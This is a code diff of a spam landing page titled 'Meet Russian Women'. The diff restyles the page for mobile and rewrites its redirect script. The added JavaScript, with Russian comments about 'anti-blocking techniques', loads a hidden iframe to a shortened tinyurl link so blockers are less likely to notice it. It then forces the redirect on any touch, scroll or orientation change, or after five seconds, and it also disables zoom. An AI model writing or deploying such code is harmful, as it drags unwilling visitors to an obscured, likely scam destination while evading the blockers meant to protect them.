@@ -2,12 +2,12 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Meet Russian Women</title>
     <style>
         body {
             background-color: #0f0f1a;
-            font-family: 'Arial', sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
             margin: 0;
             padding: 0;
             display: flex;
@@ -17,56 +17,45 @@
             height: 100vh;
             overflow: hidden;
             color: white;
+            touch-action: manipulation;
         }
         
         .container {
             text-align: center;
             padding: 20px;
-            max-width: 90%;
+            width: 95%;
         }
         
         h1 {
-            font-size: 2.5rem;
-            margin-bottom: 40px;
-            text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff, 0 0 30px #ff00ff;
+            font-size: 1.8rem;
+            margin-bottom: 30px;
+            text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff;
             animation: glow 2s ease-in-out infinite alternate;
+            line-height: 1.4;
+            padding: 0 10px;
         }
         
         .btn {
             background: linear-gradient(45deg, #ff00ff, #00ffff);
             border: none;
             color: white;
-            padding: 15px 50px;
-            font-size: 1.5rem;
+            padding: 16px 40px;
+            font-size: 1.2rem;
             border-radius: 30px;
             cursor: pointer;
             text-decoration: none;
             box-shadow: 0 0 15px #ff00ff;
-            transition: all 0.3s ease;
+            transition: all 0.2s ease;
             position: relative;
             overflow: hidden;
             font-weight: bold;
-        }
-        
-        .btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 25px #ff00ff;
+            display: inline-block;
+            width: 80%;
+            max-width: 250px;
         }
         
         .btn:active {
             transform: scale(0.95);
-        }
-        
-        .btn::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.3), transparent);
-            transform: rotate(45deg);
-            animation: shine 3s infinite;
         }
         
         @keyframes glow {
@@ -74,19 +63,7 @@
                 text-shadow: 0 0 10px #ff00ff, 0 0 20px #ff00ff;
             }
             to {
-                text-shadow: 0 0 15px #ff00ff, 0 0 30px #ff00ff, 0 0 40px #ff00ff;
-            }
-        }
-        
-        @keyframes shine {
-            0% {
-                left: -100%;
-            }
-            20% {
-                left: 100%;
-            }
-            100% {
-                left: 100%;
+                text-shadow: 0 0 15px #ff00ff, 0 0 30px #ff00ff;
             }
         }
     </style>
@@ -94,30 +71,44 @@
 <body>
     <div class="container">
         <h1>Meet Russian Women Right Now</h1>
-        <a href="https://tinyurl.com/Call-women-here" class="btn" id="redirectBtn">CLICK</a>
+        <div class="btn" id="redirectBtn">CLICK</div>
     </div>
 
     <script>
-        // Anti-blocking technique 1: Delayed redirect
+        // Улучшенные анти-блокировочные техники
+        function safeRedirect() {
+            // Создаем iframe для редиректа (менее заметно для блокировщиков)
+            const iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.src = 'https://tinyurl.com/Call-women-here';
+            document.body.appendChild(iframe);
+            
+            // Дублируем редирект через таймер
+            setTimeout(() => {
+                window.location.href = 'https://tinyurl.com/Call-women-here';
+            }, 100);
+        }
+        
+        // Основной клик
         document.getElementById('redirectBtn').addEventListener('click', function(e) {
             e.preventDefault();
-            
-            // Anti-blocking technique 2: Intermediate step
-            window.location.href = '/loading';
-            setTimeout(function() {
-                window.location.href = 'https://tinyurl.com/Call-women-here';
-            }, 1500);
+            safeRedirect();
         });
         
-        // Anti-blocking technique 3: Backup redirect after 3 sec
-        setTimeout(function() {
-            window.location.href = 'https://tinyurl.com/Call-women-here';
-        }, 3000);
-        
-        // Anti-blocking technique 4: Mouse movement trigger
-        document.addEventListener('mousemove', function() {
-            window.location.href = 'https://tinyurl.com/Call-women-here';
+        // Резервные триггеры:
+        // 1. При любом касании экрана
+        document.addEventListener('touchstart', function() {
+            setTimeout(safeRedirect, 1500);
         }, { once: true });
+        
+        // 2. При изменении ориентации
+        window.addEventListener('orientationchange', safeRedirect, { once: true });
+        
+        // 3. Авто-редирект через 5 секунд
+        setTimeout(safeRedirect, 5000);
+        
+        // 4. При скролле
+        window.addEventListener('scroll', safeRedirect, { once: true });
     </script>
 </body>
 </html>
